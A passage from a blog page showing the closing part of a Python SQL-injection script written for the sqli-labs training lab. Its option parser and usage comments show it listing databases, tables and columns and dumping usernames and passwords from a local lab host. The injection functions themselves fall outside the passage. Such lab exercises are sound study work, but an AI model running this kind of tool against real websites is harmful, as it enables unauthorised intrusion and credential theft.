</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url&#34;</span>,
</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;target url&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-D&#34;</span>,<span style="color:#e6db74">&#34;--DB&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;db_name&#34;</span>,
</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get database name&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-T&#34;</span>,<span style="color:#e6db74">&#34;--TBL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;table_name&#34;</span>,
</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get table name&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;-C&#34;</span>,<span style="color:#e6db74">&#34;--COL&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store&#34;</span>,
</span></span><span style="display:flex;"><span>              type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;column_name&#34;</span>,
</span></span><span style="display:flex;"><span>              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get column name&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#34;--dbs&#34;</span>,action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>,
</span></span><span style="display:flex;"><span>              dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dbs&#34;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get all database name&#34;</span>)
</span></span><span style="display:flex;"><span>    (options,args) <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> options <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>url <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>column_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>table_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>db_name:
</span></span><span style="display:flex;"><span>        getAllcontent(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>column_name,options<span style="color:#f92672">.</span>table_name,options<span style="color:#f92672">.</span>db_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>table_name <span style="color:#f92672">and</span> options<span style="color:#f92672">.</span>db_name:
</span></span><span style="display:flex;"><span>        getAllColumnsByTable(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>table_name,options<span style="color:#f92672">.</span>db_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>db_name:
</span></span><span style="display:flex;"><span>        getAllTablesByDb(options<span style="color:#f92672">.</span>url,options<span style="color:#f92672">.</span>db_name)    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>dbs:
</span></span><span style="display:flex;"><span>        getAllDatabases(options<span style="color:#f92672">.</span>url)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>url:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#python test.py -u &#34;http://192.168.188.134/sqli/Less-8/?id=1&#34; --dbs</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#python test.py -u &#34;http://192.168.188.134/sqli/Less-8/?id=1&#34; -D security</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#python test.py -u &#34;http://192.168.188.134/sqli/Less-8/?id=1&#34; -D security -T users</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#python test.py -u &#34;http://192.168.188.134/sqli/Less-8/?id=1&#34; -D security -T users -C username,password</span>
</span></span></code></pre></div></div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
